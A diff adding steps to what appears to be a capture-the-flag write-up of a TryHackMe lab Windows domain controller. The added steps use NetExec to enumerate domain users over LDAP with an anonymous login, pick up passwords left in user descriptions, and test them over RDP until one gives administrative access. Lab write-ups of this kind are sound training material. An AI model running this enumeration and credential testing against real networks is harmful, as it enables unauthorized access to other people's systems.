@@ -335,6 +335,28 @@ SMB         labyrinth.thm.local 445    LABYRINTH        [+] thm.local\guest:
 SMB         labyrinth.thm.local 445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
 SMB         labyrinth.thm.local 445    LABYRINTH        [+] thm.local\guest: 
 ```
+- __enumerating the domain controller for users and policies__
+```
+┌──(root㉿kali)-[~]
+└─# nxc ldap 10.10.214.56 -u "a" -p "" --users
+LDAP        10.10.214.56    389    LABYRINTH        IVY_WILLIS                    2023-05-30 12:30:55 0       Please change it: ************
+LDAP        10.10.214.56    389    LABYRINTH        SUSANNA_MCKNIGHT              2023-07-05 15:11:32 0       Please change it: ************
+```
+
+- __checking if rdp login is there are not__
+```
+┌──(root㉿kali)-[~]
+└─# nxc rdp 10.10.214.56 -u "IVY_WILLIS" -p "************"
+RDP         10.10.214.56    3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
+RDP         10.10.214.56    3389   LABYRINTH        [+] thm.local\IVY_WILLIS:************ 
+
+┌──(root㉿kali)-[~]
+└─# nxc rdp 10.10.214.56 -u "SUSANNA_MCKNIGHT" -p "************"
+RDP         10.10.214.56    3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
+RDP         10.10.214.56    3389   LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:************ (Pwn3d!)
+```
+
+
 
 
 
